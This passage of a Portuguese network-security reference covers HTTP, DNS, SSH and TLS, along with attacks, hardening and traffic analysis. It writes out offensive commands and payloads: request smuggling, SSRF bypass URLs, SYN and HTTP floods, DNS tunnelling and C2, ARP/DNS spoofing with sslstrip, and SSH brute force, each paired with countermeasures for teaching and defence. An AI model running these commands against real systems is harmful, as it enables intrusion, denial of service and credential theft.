ntpq -p

# SNMP (161/162)
snmpwalk -v2c -c public 192.168.1.1

# TFTP (69)
tftp 192.168.1.100
> get file.txt

# Syslog (514)
logger -n 192.168.1.100 -P 514 "Test message"

# RADIUS (1812/1813)
# RTP/RTCP (streaming)
# QUIC (443) - HTTP/3
```

---

## Camada de Aplicação (Layer 7)

### HTTP/HTTPS

#### Especificação Técnica

**RFC**: 
- RFC 2616 (HTTP/1.1)
- RFC 7540 (HTTP/2)
- RFC 9114 (HTTP/3)
- RFC 2818 (HTTP over TLS)

**Portas**: 
- HTTP: 80
- HTTPS: 443

**Métodos HTTP**:

| Método | Descrição | Idempotente | Seguro | Uso |
|--------|-----------|-------------|--------|-----|
| **GET** | Recuperar recurso | Sim | Sim | Consultas |
| **POST** | Criar recurso | Não | Não | Envio de dados |
| **PUT** | Atualizar/criar | Sim | Não | Substituição completa |
| **PATCH** | Atualização parcial | Não | Não | Modificação parcial |
| **DELETE** | Remover recurso | Sim | Não | Exclusão |
| **HEAD** | GET sem body | Sim | Sim | Metadados |
| **OPTIONS** | Métodos permitidos | Sim | Sim | CORS |
| **TRACE** | Eco da requisição | Sim | Não | Debugging (PERIGOSO) |
| **CONNECT** | Túnel TCP | Não | Não | Proxies |

#### Vulnerabilidades e Ataques

**1. HTTP Request Smuggling**

Exploração de discrepâncias no parsing de HTTP entre proxies e servidores.

```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable.com
```

**Teste**:

```bash
# Detectar com ferramenta especializada
python3 smuggler.py --url https://target.com

# Burp Suite: HTTP Request Smuggler extension
```

**2. HTTP Response Splitting**

Injeção de headers para dividir resposta HTTP.

```bash
# Payload
/%0d%0aSet-Cookie:%20malicious=true

# Resultado: duas respostas HTTP
```

**3. Slowloris (DoS)**

Manter conexões HTTP abertas indefinidamente.

```bash
# slowloris
python slowloris.py target.com -p 80 -s 500

# Contramedida: timeout agressivo, rate limiting
# Apache:
# Timeout 60
# RequestReadTimeout header=20-40,minrate=500

# Nginx (mais resistente):
# client_body_timeout 10s;
# client_header_timeout 10s;
```

**4. HTTP Flood (Layer 7 DDoS)**

Requisições HTTP legítimas em volume alto.

```bash
# hping3 (limitado)
sudo hping3 -S -p 80 --flood target.com

# Apache Benchmark (ab)
ab -n 1000000 -c 1000 http://target.com/

# LOIC (Low Orbit Ion Cannon)
# HOIC (High Orbit Ion Cannon)

# Contramedida:
# - Rate limiting (nginx limit_req)
# - WAF (ModSecurity, Cloudflare)
# - CAPTCHA em suspeita
```

**5. SSRF (Server-Side Request Forgery)**

Forçar servidor a fazer requisições internas.

```bash
# Payload
http://vulnerable.com/fetch?url=http://localhost:6379/

# Bypass filters
http://127.1/admin
http://[::1]/admin
http://2130706433/admin  # decimal de 127.0.0.1
http://0x7f.0x0.0x0.0x1/admin  # hexadecimal

# Testar SSRF
curl "http://target.com/api?url=http://burpcollaborator.net"
```

#### Headers de Segurança

```http
# Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

# HSTS (HTTP Strict Transport Security)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# X-Frame-Options (Clickjacking)
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN

# X-Content-Type-Options
X-Content-Type-Options: nosniff

# X-XSS-Protection (deprecated, use CSP)
X-XSS-Protection: 1; mode=block

# Referrer-Policy
Referrer-Policy: strict-origin-when-cross-origin

# Permissions-Policy
Permissions-Policy: geolocation=(), microphone=()
```

#### Comandos de Análise

```bash
# Requisição simples
curl -v http://example.com

# Ver headers
curl -I https://example.com

# Método específico
curl -X POST -d "data=value" http://example.com/api

# Headers customizados
curl -H "Authorization: Bearer TOKEN" https://api.example.com

# Seguir redirects
curl -L http://example.com

# Ignorar certificado SSL (apenas teste!)
curl -k https://self-signed.badssl.com/

# Capturar HTTP
sudo tcpdump -i eth0 'tcp port 80' -A

# Capturar HTTPS (apenas handshake)
sudo tcpdump -i eth0 'tcp port 443'

# Wireshark filters
http
http.request.method == "POST"
http.response.code == 200
http.host contains "google"
http.user_agent contains "bot"
http.request.uri contains "admin"
http.cookie contains "session"

# Ver HTTP/2
http2

# Análise de TLS
tls.handshake.type == 1  # Client Hello
tls.handshake.type == 2  # Server Hello
tls.handshake.ciphersuite

# Extrair objetos HTTP no Wireshark
# File > Export Objects > HTTP
```

#### Testing HTTP Security

```bash
# nikto - scanner de vulnerabilidades web
nikto -h http://target.com

# OWASP ZAP
zap-cli quick-scan -s all http://target.com

# wfuzz - fuzzing
wfuzz -c -z file,wordlist.txt http://target.com/FUZZ

# gobuster - directory brute force
gobuster dir -u http://target.com -w wordlist.txt

# Headers de segurança
curl -I https://target.com | grep -E 'Strict-Transport|X-Frame|Content-Security'

# Testar HTTPS
testssl.sh https://target.com
sslscan target.com:443
```

---

### DNS (Domain Name System)

#### Especificação Técnica

**RFC**:
- RFC 1034/1035 (DNS)
- RFC 4033/4034/4035 (DNSSEC)
- RFC 8484 (DNS over HTTPS - DoH)
- RFC 7858 (DNS over TLS - DoT)

**Porta**: 53 (UDP/TCP)

**Tipos de Registros**:

| Tipo | Descrição | Exemplo |
|------|-----------|---------|
| **A** | IPv4 address | `example.com. IN A 93.184.216.34` |
| **AAAA** | IPv6 address | `example.com. IN AAAA 2606:2800:220:1:248:1893:25c8:1946` |
| **CNAME** | Canonical name (alias) | `www IN CNAME example.com.` |
| **MX** | Mail exchange | `example.com. IN MX 10 mail.example.com.` |
| **NS** | Name server | `example.com. IN NS ns1.example.com.` |
| **TXT** | Text record | `example.com. IN TXT "v=spf1 include:_spf.google.com ~all"` |
| **PTR** | Pointer (reverse DNS) | `34.216.184.93.in-addr.arpa. IN PTR example.com.` |
| **SOA** | Start of Authority | Informações sobre zona |
| **SRV** | Service locator | `_http._tcp.example.com. IN SRV 10 5 80 www.example.com.` |
| **CAA** | Certification Authority Authorization | Restringe quem pode emitir certificados |

#### Estrutura do Pacote DNS

```
 0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                      ID                       |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    QDCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ANCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    NSCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
|                    ARCOUNT                    |
+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
```

**Campos**:
- **ID**: Identificador de transação
- **QR**: Query (0) ou Response (1)
- **Opcode**: Tipo de query (0=QUERY, 1=IQUERY, 2=STATUS)
- **AA**: Authoritative Answer
- **TC**: Truncated
- **RD**: Recursion Desired
- **RA**: Recursion Available
- **RCODE**: Response code (0=NOERROR, 3=NXDOMAIN)

#### Vulnerabilidades e Ataques

**1. DNS Cache Poisoning (Kaminsky Attack)**

Envenenar cache DNS com registros falsos.

```bash
# Ataque clássico (pre-2008)
# 1. Enviar query legítimo
# 2. Enviar múltiplas respostas falsas com diferentes IDs
# 3. Se acertar o ID, cache é envenenado

# Contramedida:
# - Randomização de porta origem (port randomization)
# - DNSSEC
# - Randomização de ID de transação
# - 0x20 encoding (randomizar case em queries)

# Testar randomização
for i in {1..10}; do
    dig @8.8.8.8 google.com | grep "Query time"
done

# Verificar DNSSEC
dig +dnssec google.com

# Validar DNSSEC
dig +dnssec +multi google.com | grep -A 2 "RRSIG"
```

**2. DNS Amplification (DDoS)**

```bash
# Explorar servidores DNS abertos para amplificação
# Fator de amplificação: até 54x

# Buscar DNS open resolvers
nmap -sU -p 53 --script dns-recursion 192.168.1.0/24

# Testar recursão
dig @target-dns.com google.com

# Contramedidas:
# - Desabilitar recursão em servidores autoritativos
# - Rate limiting
# - BCP 38 (anti-spoofing)
# - Response Rate Limiting (RRL)

# Configurar BIND para rate limiting
rate-limit {
    responses-per-second 5;
    window 5;
};
```

**3. DNS Tunneling (Data Exfiltration)**

Esconder dados em queries/respostas DNS.

```bash
# iodine - túnel IP sobre DNS
# Servidor (requer domínio próprio)
sudo iodined -f 10.0.0.1 tunnel.example.com

# Cliente
sudo iodine -f tunnel.example.com

# dnscat2 - C2 sobre DNS
# Servidor
ruby dnscat2.rb tunnel.example.com

# Cliente
./dnscat2 tunnel.example.com

# Detecção:
# - Queries longas e incomuns
# - Alto volume de queries para mesmo domínio
# - Entropy analysis
# - TXT/NULL records

# Detectar DNS tunneling
sudo tcpdump -i eth0 'udp port 53' -v | grep -E 'length > 100'

# Análise de entropy (dados aleatórios = possível exfiltração)
tshark -r capture.pcap -Y dns -T fields -e dns.qry.name | \
    while read line; do echo "$line $(echo -n "$line" | ent)"; done
```

**4. DNS Spoofing/Hijacking**

```bash
# Local - modificar /etc/hosts
echo "93.184.216.34 facebook.com" | sudo tee -a /etc/hosts

# Rede - responder (LLMNR/NBT-NS/MDNS poisoning)
sudo responder -I eth0 -wrf

# ARP + DNS spoofing
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100// \
    -P dns_spoof

# Arquivo de DNS spoof do ettercap: /etc/ettercap/etter.dns
example.com A 192.168.1.50
*.example.com A 192.168.1.50
```

**5. DNS Enumeration (Reconhecimento)**

```bash
# Zone transfer (AXFR) - se mal configurado
dig @ns1.example.com example.com AXFR

# Brute force de subdomínios
dnsrecon -d example.com -t brt -D subdomains.txt

# Fierce
fierce --domain example.com

# Amass (completo)
amass enum -d example.com

# DNSdumpster (online)
# https://dnsdumpster.com/

# Reverse DNS sweep
dnsrecon -r 93.184.216.0/24

# Google dorking para subdomínios
site:example.com -www

# Certificate Transparency logs
curl -s "https://crt.sh/?q=%.example.com&output=json" | \
    jq -r '.[].name_value' | sort -u
```

#### Comandos de Análise

```bash
# dig - ferramenta principal
dig example.com
dig example.com A
dig example.com MX
dig example.com NS
dig example.com TXT
dig example.com ANY

# Query em servidor específico
dig @8.8.8.8 example.com

# Trace completo (root -> TLD -> authoritative)
dig +trace example.com

# Resposta curta
dig +short example.com

# Reverse DNS
dig -x 8.8.8.8

# DNSSEC validation
dig +dnssec example.com

# nslookup (legado, mas ainda usado)
nslookup example.com
nslookup example.com 8.8.8.8

# host
host example.com
host -t MX example.com

# Capturar DNS
sudo tcpdump -i eth0 'udp port 53' -v

# Ver apenas queries
sudo tcpdump -i eth0 'udp port 53 and udp[10] & 0x80 = 0'

# Ver apenas responses
sudo tcpdump -i eth0 'udp port 53 and udp[10] & 0x80 = 0x80'

# Wireshark filters
dns
dns.qry.name == "example.com"
dns.flags.response == 0  # Query
dns.flags.response == 1  # Response
dns.flags.rcode != 0     # Erro
dns.qry.type == 1        # A record
dns.qry.type == 15       # MX record
dns.qry.type == 16       # TXT record

# Detectar queries longas (tunneling)
dns.qry.name.len > 50

# Ver DNSSEC
dns.resp.type == 46  # RRSIG
dns.resp.type == 48  # DNSKEY
```

#### DNS Security Best Practices

```bash
# 1. Usar DNSSEC
dnssec-keygen -a RSASHA256 -b 2048 example.com
dnssec-signzone -o example.com db.example.com

# 2. DNS over TLS (DoT) - porta 853
# /etc/systemd/resolved.conf
[Resolve]
DNS=1.1.1.1#cloudflare-dns.com
DNSOverTLS=yes

# 3. DNS over HTTPS (DoH)
# Firefox: about:config > network.trr.mode = 2
# Chrome: chrome://settings/security

# 4. Monitorar DNS
# PiHole, Zeek, Suricata

# 5. Rate limiting
# BIND: rate-limit
# NSD: rrl-size, rrl-ratelimit

# 6. Desabilitar recursão em autoritativos
# BIND:
recursion no;
allow-query { localhost; };

# 7. Esconder versão
# BIND:
version "Not disclosed";
```

---

### SSH (Secure Shell)

#### Especificação Técnica

**RFC**: 
- RFC 4250-4256 (SSH Protocol)
- RFC 4716 (SSH Public Key File Format)

**Porta**: 22 (padrão)

**Versões**: 
- SSHv1 (INSEGURO, descontinuado)
- SSHv2 (atual)

#### Estrutura da Conexão SSH

```
Cliente                                    Servidor
   |                                           |
   |---------- TCP 3-way handshake ----------->|
   |                                           |
   |<--------- Protocol Version Exchange ----->|
   |  "SSH-2.0-OpenSSH_8.2"                   |
   |                                           |
   |<----------- Key Exchange (DH) ----------->|
   |  Estabelecer chaves de sessão            |
   |                                           |
   |<--------- Authentication --------------->|
   |  Password, Public Key, etc.              |
   |                                           |
   |<======= Canal Criptografado ============>|
```

**Algoritmos Comuns**:

```bash
# Key Exchange
- diffie-hellman-group-exchange-sha256
- curve25519-sha256
- ecdh-sha2-nistp256

# Host Key
- ssh-ed25519 (recomendado)
- ecdsa-sha2-nistp256
- rsa-sha2-512

# Cipher
- chacha20-poly1305@openssh.com (recomendado)
- aes256-gcm@openssh.com
- aes256-ctr

# MAC
- hmac-sha2-512-etm@openssh.com
- hmac-sha2-256-etm@openssh.com
```

#### Vulnerabilidades e Ataques

**1. SSH Brute Force**

```bash
# Hydra
hydra -l root -P passwords.txt ssh://192.168.1.100

# Medusa
medusa -h 192.168.1.100 -u root -P passwords.txt -M ssh

# Ncrack
ncrack -p 22 --user root -P passwords.txt 192.168.1.100

# Contramedidas:
# 1. Desabilitar password authentication
PasswordAuthentication no

# 2. Permitir apenas chave pública
PubkeyAuthentication yes

# 3. Fail2ban
sudo apt install fail2ban
# /etc/fail2ban/jail.local
[sshd]
enabled = true
maxretry = 3
bantime = 3600

# 4. Rate limiting com iptables
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
    -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP

# 5. Usar porta não padrão (security by obscurity, mas ajuda)
Port 2222

# 6. Permitir apenas usuários específicos
AllowUsers alice bob

# 7. Desabilitar root login
PermitRootLogin no
```

**2. SSH User Enumeration**

```bash
# Timing attack (CVE-2018-15473) - OpenSSH < 7.7
python3 ssh_user_enum.py --port 22 --userList users.txt 192.168.1.100

# Contramedida: atualizar OpenSSH
```

**3. SSH Man-in-the-Middle**

```bash
# Atacante intercepta conexão inicial
# Requisito: ARP poisoning ou rogue DHCP

# ssh-mitm
sudo ssh-mitm --listen-port 22 --target-host 192.168.1.100

# Contramedida: verificar host key fingerprint
# Primeira conexão mostra fingerprint:
The authenticity of host '192.168.1.100' can't be established.
ED25519 key fingerprint is SHA256:abc123...
Are you sure you want to continue connecting (yes/no)?

# Verificar fingerprint no servidor
ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub
```

**4. SSH Key Hijacking**

```bash
# Se ~/.ssh/ tem permissões erradas, chaves podem ser roubadas

# Verificar permissões corretas
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 600 ~/.ssh/authorized_keys

# No servidor: verificar authorized_keys
# Remove chaves desconhecidas
```

**5. SSH Tunneling (Port Forwarding) para Pivoting**

```bash
# Local Port Forwarding
# Acessar serviço remoto via porta local
ssh -L 8080:internal-server:80 user@jump-host
curl http://localhost:8080

# Remote Port Forwarding
# Expor serviço local remotamente
ssh -R 9090:localhost:3000 user@remote-server

# Dynamic Port Forwarding (SOCKS Proxy)
ssh -D 1080 user@remote-server
# Configurar browser para SOCKS5 localhost:1080

# ProxyJump (salto entre servidores)
ssh -J jump-host target-server

# Contramedida: restringir forwarding
AllowTcpForwarding no
GatewayPorts no
X11Forwarding no
```

#### Hardening SSH

```bash
# /etc/ssh/sshd_config

# Protocolo
Protocol 2

# Autenticação
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

# Criptografia forte
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

# Timeouts
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 60

# Limites
MaxAuthTries 3
MaxSessions 2
MaxStartups 10:30:60

# Restringir usuários
AllowUsers alice bob
DenyUsers root

# Restringir IPs (usar firewall é melhor)
# AllowUsers alice@192.168.1.*

# Forwarding
AllowTcpForwarding no
X11Forwarding no
PermitTunnel no

# Banner
Banner /etc/ssh/banner.txt

# Logging
LogLevel VERBOSE
SyslogFacility AUTH

# Recarregar configuração
sudo systemctl reload sshd
```

#### Comandos de Análise

```bash
# Verificar configuração SSH
sudo sshd -T

# Testar algoritmos suportados
nmap --script ssh2-enum-algos -p 22 192.168.1.100

# Verificar versão SSH
nc 192.168.1.100 22
# ou
telnet 192.168.1.100 22

# Scan de SSH
nmap -p 22 --script ssh-hostkey,ssh-auth-methods 192.168.1.100

# Capturar handshake SSH
sudo tcpdump -i eth0 'tcp port 22' -w ssh.pcap

# Wireshark filters
ssh
tcp.port == 22
ssh.protocol contains "OpenSSH"

# Ver tentativas de login SSH (logs)
sudo grep "Failed password" /var/log/auth.log
sudo grep "Accepted publickey" /var/log/auth.log

# Monitorar conexões SSH ativas
ss -tan | grep ':22'
who
w

# Matar sessão SSH
pkill -9 -t pts/1  # substituir pts/1 pelo terminal

# Auditoria de chaves SSH
ssh-keyscan -t ed25519 192.168.1.100

# Testar conexão SSH com verbose
ssh -vvv user@192.168.1.100
```

#### SSH Forense

```bash
# Logs importantes
/var/log/auth.log          # Debian/Ubuntu
/var/log/secure            # Red Hat/CentOS
~/.ssh/known_hosts         # Histórico de conexões
/var/log/btmp              # Tentativas falhadas
/var/log/wtmp              # Logins bem-sucedidos

# Ver últimos logins
last
lastb  # Tentativas falhadas

# Ver sessões ativas
w
who

# Auditoria de authorized_keys
find /home -name authorized_keys 2>/dev/null

# Detectar backdoors SSH
# Verificar: /etc/ssh/sshd_config, ~/.ssh/authorized_keys
grep -r "command=" /home/*/.ssh/authorized_keys
```

---

## Protocolos de Segurança

### TLS/SSL

#### Especificação Técnica

**RFC**:
- RFC 8446 (TLS 1.3)
- RFC 5246 (TLS 1.2)
- RFC 6101 (SSL 3.0 - INSEGURO)

**Portas**: Varia conforme protocolo (HTTPS: 443, SMTPS: 465, IMAPS: 993)

**Versões**:
- SSL 2.0 (INSEGURO - 1995)
- SSL 3.0 (INSEGURO - 1996)
- TLS 1.0 (INSEGURO - 1999)
- TLS 1.1 (INSEGURO - 2006)
- TLS 1.2 (OK - 2008)
- TLS 1.3 (RECOMENDADO - 2018)

#### TLS Handshake (TLS 1.2)

```
Cliente                                    Servidor
   |                                           |
   |---------- Client Hello ------------------>|
   |  (versão, ciphersuites, random)          |
   |                                           |
   |<--------- Server Hello -------------------|
   |  (versão escolhida, ciphersuite, random) |
   |                                           |
   |<--------- Certificate --------------------|
   |  (certificado X.509 do servidor)         |
   |                                           |
   |<--------- Server Hello Done --------------|
   |                                           |
   |---------- Client Key Exchange ----------->|
   |  (pre-master secret criptografado)       |
   |                                           |
   |---------- Change Cipher Spec ------------>|
   |                                           |
   |---------- Finished ---------------------->|
   |  (hash de todas as mensagens)            |
   |                                           |
   |<--------- Change Cipher Spec -------------|
   |                                           |
   |<--------- Finished -----------------------|
   |                                           |
   |<======= Comunicação Criptografada ======>|
```

#### Vulnerabilidades e Ataques

**1. BEAST (Browser Exploit Against SSL/TLS)**

Ataque contra TLS 1.0 com cipher CBC.

**Contramedida**: Usar TLS 1.2+ ou ciphers não-CBC.

**2. CRIME (Compression Ratio Info-leak Made Easy)**

Exploração de compressão TLS.

```bash
# Testar CRIME
nmap --script ssl-enum-ciphers -p 443 target.com | grep -i compression

# Contramedida: desabilitar compressão TLS
# Nginx:
ssl_compression off;
```

**3. BREACH (Browser Reconnaissance and Exfiltration via Adaptive Compression of Hypertext)**

Similar ao CRIME, mas no HTTP compression.

**Contramedida**: Desabilitar compressão HTTP para dados sensíveis.

**4. POODLE (Padding Oracle On Downgraded Legacy Encryption)**

Ataque contra SSL 3.0.

```bash
# Testar POODLE
nmap --script ssl-poodle -p 443 target.com

# Contramedida: desabilitar SSL 3.0
# Nginx:
ssl_protocols TLSv1.2 TLSv1.3;
```

**5. Heartbleed (CVE-2014-0160)**

Buffer over-read em OpenSSL.

```bash
# Testar Heartbleed
nmap --script ssl-heartbleed -p 443 target.com

# Contramedida: atualizar OpenSSL
```

**6. FREAK (Factoring RSA Export Keys)**

Downgrade para export-grade cryptography.

```bash
# Testar FREAK
nmap --script ssl-enum-ciphers -p 443 target.com | grep "RSA_EXPORT"

# Contramedida: desabilitar export ciphers
```

**7. Logjam**

Ataque contra Diffie-Hellman export-grade.

```bash
# Contramedida: usar DH key >= 2048 bits
```

**8. DROWN (Decrypting RSA with Obsolete and Weakened eNcryption)**

Ataque usando SSLv2.

```bash
# Testar DROWN
nmap --script ssl-drown -p 443 target.com

# Contramedida: desabilitar SSLv2
```

**9. Certificate Validation Issues**

```bash
# Self-signed certificate
openssl s_client -connect self-signed.badssl.com:443

# Expired certificate
openssl s_client -connect expired.badssl.com:443

# Wrong hostname
openssl s_client -connect wrong.host.badssl.com:443

# Contramedida: validar certificados corretamente (TOFU, Certificate Pinning)
```

#### Configuração Segura TLS

```bash
# Nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384';
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload";

# Apache
SSLProtocol -all +TLSv1.2 +TLSv1.3
SSLCipherSuite ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
SSLHonorCipherOrder off
SSLCompression off
SSLUseStapling on
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
```

#### Comandos de Análise

```bash
# Testar conexão TLS
openssl s_client -connect example.com:443

# Ver certificado
openssl s_client -connect example.com:443 -showcerts

# Ver apenas certificado
openssl s_client -connect example.com:443 2>/dev/null | \
    openssl x509 -text -noout

# Testar versão TLS específica
openssl s_client -connect example.com:443 -tls1_2
openssl s_client -connect example.com:443 -tls1_3

# Ver ciphersuites suportados
nmap --script ssl-enum-ciphers -p 443 example.com

# Scan completo de vulnerabilidades TLS
testssl.sh https://example.com
sslscan example.com:443

# sslyze
sslyze --regular example.com:443

# Verificar OCSP stapling
openssl s_client -connect example.com:443 -status

# Capturar handshake TLS
sudo tcpdump -i eth0 'tcp port 443' -w tls.pcap

# Wireshark filters
tls
tls.handshake.type == 1  # Client Hello
tls.handshake.type == 2  # Server Hello
tls.handshake.type == 11 # Certificate
tls.handshake.version == 0x0303  # TLS 1.2
tls.handshake.version == 0x0304  # TLS 1.3
tls.handshake.ciphersuite
tls.alert_message

# Descriptografar TLS no Wireshark (requer SSLKEYLOGFILE)
# Firefox/Chrome: export SSLKEYLOGFILE=/tmp/sslkeys.log
# Wireshark: Edit > Preferences > Protocols > TLS > (Pre)-Master-Secret log filename
```

---

## Vulnerabilidades e Ataques

### Ataques de Rede Comuns

#### 1. Man-in-the-Middle (MitM)

```bash
# ARP Spoofing + Sniffing
sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//

# Bettercap (moderno)
sudo bettercap -iface eth0
> net.probe on
> net.recon on
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> net.sniff on
> http.proxy on
> https.proxy on
> set https.proxy.sslstrip true
> hstshijack/hstshijack

# Detecção:
# - Verificar ARP cache (multiple MACs for same IP)
# - Certificate warnings
# - Usar HSTS
# - Certificate Pinning
```

#### 2. Packet Sniffing

```bash
# tcpdump
sudo tcpdump -i eth0 -w capture.pcap

# Wireshark/tshark
sudo wireshark
tshark -i eth0 -f "tcp port 80"

# Contramedida:
# - Usar criptografia (TLS, VPN)
# - Switch port security
# - Detecção de modo promíscuo
```

#### 3. Session Hijacking

```bash
# Ferramenta: Burp Suite, OWASP ZAP
# 1. Capturar cookie de sessão (sniffing, XSS)
# 2. Usar cookie em novo request

# Contramedida:
# - HttpOnly flag
# - Secure flag
# - SameSite attribute
# - Session timeout
# - Bind session to IP/User-Agent
```

#### 4. Replay Attack

```bash
# Capturar pacote válido e reenviar
sudo tcpdump -i eth0 -w auth.pcap 'host 192.168.1.100'
tcpreplay -i eth0 auth.pcap

# Contramedida:
# - Nonce (number used once)
# - Timestamp
# - Sequence numbers
```

#### 5. DoS/DDoS

```bash
# SYN Flood
sudo hping3 -S -p 80 --flood --rand-source target.com

# UDP Flood
sudo hping3 --udp -p 53 --flood target.com

# HTTP Flood
ab -n 1000000 -c 1000 http://target.com/

# Amplification (DNS, NTP, Memcached)
# Usar servidor vulnerável para amplificar ataque

# Contramedida:
# - Rate limiting
# - SYN cookies
# - Firewall rules
# - CDN (Cloudflare, Akamai)
# - DDoS mitigation services
```

---

## Análise de Tráfego

### tcpdump - Filtros Avançados

```bash
# Sintaxe BPF (Berkeley Packet Filter)

# Filtros por host
sudo tcpdump host 192.168.1.100
sudo tcpdump src 192.168.1.100
sudo tcpdump dst 192.168.1.100

# Filtros por rede
sudo tcpdump net 192.168.1.0/24

# Filtros por porta
sudo tcpdump port 80
sudo tcpdump portrange 1000-2000
sudo tcpdump src port 80
sudo tcpdump dst port 443

# Filtros por protocolo
sudo tcpdump tcp
sudo tcpdump udp
sudo tcpdump icmp
sudo tcpdump arp

# Combinação de filtros
sudo tcpdump 'tcp port 80 and host 192.168.1.100'
sudo tcpdump 'tcp and (port 80 or port 443)'
sudo tcpdump 'not port 22'

# Flags TCP
sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0'
sudo tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-ack) == (tcp-syn|tcp-ack)'
sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0'

# Filtros avançados (offset)
# tcp[13] = byte 13 do cabeçalho TCP (flags)
sudo tcpdump 'tcp[13] & 2 != 0'  # SYN
sudo tcpdump 'tcp[13] & 4 != 0'  # RST
sudo tcpdump 'tcp[13] & 1 != 0'  # FIN

# Filtrar por TTL
sudo tcpdump 'ip[8] < 10'

# Filtrar pacotes fragmentados
sudo tcpdump 'ip[6] & 0x20 != 0'

# Payload específico (HTTP GET)
sudo tcpdump -A 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420'

# Salvar e ler
sudo tcpdump -i eth0 -w capture.pcap
sudo tcpdump -r capture.pcap

# Verbose e hexdump
sudo tcpdump -i eth0 -v -X

# Limitar captura
sudo tcpdump -i eth0 -c 100  # 100 pacotes
sudo tcpdump -i eth0 -W 10 -G 60 -w capture  # Rodar arquivos a cada 60s
```

### Wireshark - Display Filters

```bash
# Protocolos
http
https
dns
ssh
ftp
smtp
tcp
udp
icmp
arp

# IPs
ip.addr == 192.168.1.100
ip.src == 192.168.1.100
ip.dst == 192.168.1.100

# Portas
tcp.port == 80
tcp.srcport == 80
tcp.dstport == 443

# Flags TCP
tcp.flags.syn == 1
tcp.flags.ack == 1
tcp.flags.rst == 1
tcp.flags == 0x002  # SYN apenas

# HTTP
http.request.method == "GET"
http.request.uri contains "admin"
http.response.code == 200
http.cookie contains "session"
http.user_agent contains "bot"
http.host == "example.com"

# DNS
dns.qry.name == "example.com"
dns.flags.response == 1
dns.qry.type == 1  # A record

# TLS
tls.handshake.type == 1
tls.handshake.version == 0x0303
tls.alert_message

# Análise TCP
tcp.analysis.retransmission
tcp.analysis.duplicate_ack
tcp.analysis.lost_segment
tcp.window_size < 1000

# Combinações
(http.request.method == "POST") && (ip.dst == 192.168.1.100)
(tcp.port == 80) || (tcp.port == 443)
!(arp || icmp)

# Follow Stream
tcp.stream eq 0

# Estatísticas úteis
# Statistics > Protocol Hierarchy
# Statistics > Conversations
# Statistics > Endpoints
# Statistics > IO Graph
```

### Detecção de Anomalias

```bash
# Scan detection
sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack = 0'

# Multicast abuse
sudo tcpdump 'ip multicast'

# Alto volume de DNS queries
sudo tcpdump -i eth0 'udp port 53' -c 100 | wc -l

# Múltiplos RST (possível scan ou ataque)
sudo tcpdump 'tcp[tcpflags] & tcp-rst != 0' -c 50

# Fragmentação excessiva
sudo tcpdump 'ip[6] & 0x20 != 0' -c 20

# TTL suspeito (< 10 pode indicar múltiplos hops)
sudo tcpdump 'ip[8] < 10'

# Broadcast excessivo
sudo tcpdump 'ether broadcast'
```

---

## Referências e RFCs

### RFCs Essenciais

#### Camada de Rede
- **RFC 791** - Internet Protocol (IPv4)
- **RFC 792** - Internet Control Message Protocol (ICMP)
- **RFC 826** - Address Resolution Protocol (ARP)
- **RFC 1918** - Address Allocation for Private Internets
- **RFC 2460** - Internet Protocol Version 6 (IPv6)

#### Camada de Transporte
- **RFC 768** - User Datagram Protocol (UDP)
- **RFC 793** - Transmission Control Protocol (TCP)
